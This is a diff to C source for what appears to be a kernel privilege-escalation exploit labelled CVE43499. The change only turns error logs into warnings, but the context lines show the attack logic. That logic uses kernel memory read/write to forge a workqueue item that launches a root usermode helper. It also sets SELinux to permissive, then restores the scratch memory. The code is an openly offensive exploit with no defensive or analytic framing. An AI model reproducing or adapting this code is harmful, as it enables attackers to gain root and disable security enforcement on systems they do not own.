@@ -213,14 +213,14 @@ static int install_workqueue_umh_root(int fd) {
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
   const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
   if (!app_root_umh_path || app_root_umh_path[0] != '/') {
-    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
+    pr_warning("root umh missing CVE43499_ROOT_HELPER\n");
     return 0;
   }
   root_umh_path = app_root_umh_path;
 #endif
   if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
       (int)sizeof(umh_data.path)) {
-    pr_error("root umh helper path too long\n");
+    pr_warning("root umh helper path too long\n");
     return 0;
   }
   snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
@@ -255,19 +255,19 @@ static int install_workqueue_umh_root(int fd) {
       (fake_work_addr >> PAGE_SHIFT) != (fake_work_end >> PAGE_SHIFT) ||
       (umh_data_addr >> PAGE_SHIFT) != (umh_data_end >> PAGE_SHIFT) ||
       !(fake_work_end < umh_data_addr || umh_data_end < fake_work_addr)) {
-    pr_error("root umh bad scratch spans work=%016zx-%016zx data=%016zx-%016zx\n",
+    pr_warning("root umh bad scratch spans work=%016zx-%016zx data=%016zx-%016zx\n",
              fake_work_addr, fake_work_end, umh_data_addr, umh_data_end);
     return 0;
   }
   if (!root_read_data(fd, fake_work_addr, saved_work, sizeof(saved_work)) ||
       !root_read_data(fd, umh_data_addr, saved_data, sizeof(saved_data))) {
-    pr_error("root umh scratch old read failed\n");
+    pr_warning("root umh scratch old read failed\n");
     return 0;
   }
   scratch_saved = 1;
   if (!root_all_zero(saved_work, sizeof(saved_work)) ||
       !root_all_zero(saved_data, sizeof(saved_data))) {
-    pr_error("root umh scratch not zero work=%d data=%d\n",
+    pr_warning("root umh scratch not zero work=%d data=%d\n",
              root_all_zero(saved_work, sizeof(saved_work)),
              root_all_zero(saved_data, sizeof(saved_data)));
     return 0;
@@ -275,12 +275,12 @@ static int install_workqueue_umh_root(int fd) {
   int selinux_read = root_read_global(
       fd, selinux_addr, &selinux_old, sizeof(selinux_old));
   if (!selinux_read) {
-    pr_error("root umh selinux read failed direct=%016zx virtual=%016zx\n",
+    pr_warning("root umh selinux read failed direct=%016zx virtual=%016zx\n",
              selinux_addr, text_addr(SELINUX_ENFORCING));
     return 0;
   }
   if (selinux_old > 1) {
-    pr_error("root umh bad selinux old=%u\n", selinux_old);
+    pr_warning("root umh bad selinux old=%u\n", selinux_old);
     return 0;
   }
   pr_info("root umh spans work=%016zx-%016zx data=%016zx-%016zx selinux=%016zx old=%u\n",
@@ -295,27 +295,27 @@ static int install_workqueue_umh_root(int fd) {
   uint64_t pool_value = 0;
   uint64_t pwq_wq_value = 0;
   if (!root_read_global(fd, wq_slot, &wq_value, sizeof(wq_value))) {
-    pr_error("root umh workqueue slot read failed\n");
+    pr_warning("root umh workqueue slot read failed\n");
     goto cleanup;
   }
   uintptr_t wq = (uintptr_t)wq_value;
   if (!is_direct_ptr(wq) ||
       !root_read64(fd, wq + WQ_DFL_PWQ_OFF, &pwq_value)) {
-    pr_error("root umh pwq read failed wq=%016zx\n", wq);
+    pr_warning("root umh pwq read failed wq=%016zx\n", wq);
     goto cleanup;
   }
   uintptr_t pwq = (uintptr_t)pwq_value;
   if (!is_direct_ptr(pwq) ||
       !root_read64(fd, pwq + PWQ_POOL_OFF, &pool_value) ||
       !root_read64(fd, pwq + PWQ_WQ_OFF, &pwq_wq_value)) {
-    pr_error("root umh pool read failed pwq=%016zx\n", pwq);
+    pr_warning("root umh pool read failed pwq=%016zx\n", pwq);
     goto cleanup;
   }
   uintptr_t pool = (uintptr_t)pool_value;
   uintptr_t pwq_wq = (uintptr_t)pwq_wq_value;
   if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
       !is_direct_ptr(pool) || pwq_wq != wq) {
-    pr_error("root umh bad workqueue wq_slot=%016zx wq=%016zx "
+    pr_warning("root umh bad workqueue wq_slot=%016zx wq=%016zx "
              "pwq=%016zx pool=%016zx pwq_wq=%016zx\n",
              wq_slot, wq, pwq, pool, pwq_wq);
     return 0;
@@ -329,7 +329,7 @@ static int install_workqueue_umh_root(int fd) {
     if (!root_read64(fd, worklist, &list_next) ||
         !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
         !root_read32(fd, pool + POOL_NR_IDLE_OFF, &nr_idle)) {
-      pr_error("root umh pool state read failed\n");
+      pr_warning("root umh pool state read failed\n");
       goto cleanup;
     }
     if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
@@ -338,7 +338,7 @@ static int install_workqueue_umh_root(int fd) {
     usleep(1000);
   }
   if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
-    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
+    pr_warning("root umh pool busy pool=%016zx list=%016llx/%016llx "
              "head=%016zx idle=%u\n",
              pool, (unsigned long long)list_next,
              (unsigned long long)list_prev, worklist, nr_idle);
@@ -353,11 +353,11 @@ static int install_workqueue_umh_root(int fd) {
       !root_read32(fd, pwq + PWQ_REFCNT_OFF, &refcnt) ||
       !root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active) ||
       !root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active)) {
-    pr_error("root umh pwq state read failed\n");
+    pr_warning("root umh pwq state read failed\n");
     goto cleanup;
   }
   if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
-    pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
+    pr_warning("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
              color, refcnt, nr_active, max_active);
     goto cleanup;
   }
@@ -368,7 +368,7 @@ static int install_workqueue_umh_root(int fd) {
   if (!root_read32(fd, inflight_addr, &nr_inflight) ||
       nr_inflight == UINT32_MAX || nr_active == UINT32_MAX ||
       refcnt == UINT32_MAX) {
-    pr_error("root umh bad counters inflight=%u active=%u refcnt=%u\n",
+    pr_warning("root umh bad counters inflight=%u active=%u refcnt=%u\n",
              nr_inflight, nr_active, refcnt);
     goto cleanup;
   }
@@ -398,7 +398,7 @@ static int install_workqueue_umh_root(int fd) {
       !root_read_data(fd, fake_work_addr, scratch_readback,
                       sizeof(fake)) ||
       memcmp(scratch_readback, &fake, sizeof(fake)) != 0) {
-    pr_error("root umh scratch write/readback failed data=%d work=%d\n",
+    pr_warning("root umh scratch write/readback failed data=%d work=%d\n",
              data_write, work_write);
     goto cleanup;
   }
@@ -410,7 +410,7 @@ static int install_workqueue_umh_root(int fd) {
         !root_read_global(fd, selinux_addr, &selinux_readback,
                           sizeof(selinux_readback)) ||
         selinux_readback != permissive) {
-      pr_error("root umh selinux write/readback failed now=%u\n",
+      pr_warning("root umh selinux write/readback failed now=%u\n",
                selinux_readback);
       goto cleanup;
     }
@@ -419,7 +419,7 @@ static int install_workqueue_umh_root(int fd) {
   if (!root_read64(fd, worklist, &list_next) ||
       !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
       list_next != worklist || list_prev != worklist) {
-    pr_error("root umh worklist changed before queue next=%016llx prev=%016llx\n",
+    pr_warning("root umh worklist changed before queue next=%016llx prev=%016llx\n",
              (unsigned long long)list_next,
              (unsigned long long)list_prev);
     goto cleanup;
@@ -439,7 +439,7 @@ static int install_workqueue_umh_root(int fd) {
       fd, worklist + sizeof(uint64_t), fake_entry);
   if (!list_prev_write ||
       !root_read64(fd, worklist, &list_next) || list_next != worklist) {
-    pr_error("root umh prepublish write failed counters=%d/%d/%d prev=%d next=%016llx\n",
+    pr_warning("root umh prepublish write failed counters=%d/%d/%d prev=%d next=%016llx\n",
              inflight_write, active_write, refcnt_write, list_prev_write,
              (unsigned long long)list_next);
     goto cleanup;
@@ -452,7 +452,7 @@ static int install_workqueue_umh_root(int fd) {
        published_next == fake_entry)) {
     published = 1;
   } else {
-    pr_error("root umh publish failed ret=%d next=%016llx\n",
+    pr_warning("root umh publish failed ret=%d next=%016llx\n",
              list_next_write, (unsigned long long)published_next);
     goto cleanup;
   }
@@ -469,7 +469,7 @@ static int install_workqueue_umh_root(int fd) {
     wake_ok |= wake_system_unbound();
     for (int j = 0; j < 250; j++) {
       if (!root_read32(fd, completion_addr, &complete_done)) {
-        pr_error("root umh completion read failed\n");
+        pr_warning("root umh completion read failed\n");
         goto cleanup;
       }
       if (complete_done) {
@@ -485,7 +485,7 @@ static int install_workqueue_umh_root(int fd) {
                    fake_work_addr +
                        offsetof(struct umh_subprocess_info, retval),
                    &retval_value)) {
-    pr_error("root umh retval read failed\n");
+    pr_warning("root umh retval read failed\n");
     goto cleanup;
   }
   int32_t umh_retval = (int32_t)retval_value;
@@ -523,10 +523,10 @@ cleanup:
           fd, inflight_addr, nr_inflight + 1, nr_inflight);
     }
     if (!rollback_ok) {
-      pr_error("root umh prepublish rollback failed\n");
+      pr_warning("root umh prepublish rollback failed\n");
     }
   } else if (!complete_done) {
-    pr_error("root umh published but incomplete; scratch retained\n");
+    pr_warning("root umh published but incomplete; scratch retained\n");
   }
 
   if (scratch_saved && (!published || complete_done)) {
@@ -547,7 +547,7 @@ cleanup:
     pr_info("root umh scratch restore work=%d/%d data=%d/%d\n",
             work_restore, work_match, data_restore, data_match);
     if (!work_restore || !work_match || !data_restore || !data_match) {
-      pr_error("root umh scratch restore failed\n");
+      pr_warning("root umh scratch restore failed\n");
     }
   }
 
@@ -565,10 +565,10 @@ cleanup:
     pr_info("root umh selinux rollback=%d old=%u now=%u\n",
             restore_ok, selinux_old, current);
     if (!restore_ok) {
-      pr_error("root umh selinux rollback failed\n");
+      pr_warning("root umh selinux rollback failed\n");
     }
   } else if (!result && selinux_changed) {
-    pr_error("root umh selinux retained while published work is incomplete\n");
+    pr_warning("root umh selinux retained while published work is incomplete\n");
   } else if (result) {
     pr_info("root umh selinux left=%u intended root state old=%u\n",
             permissive, selinux_old);
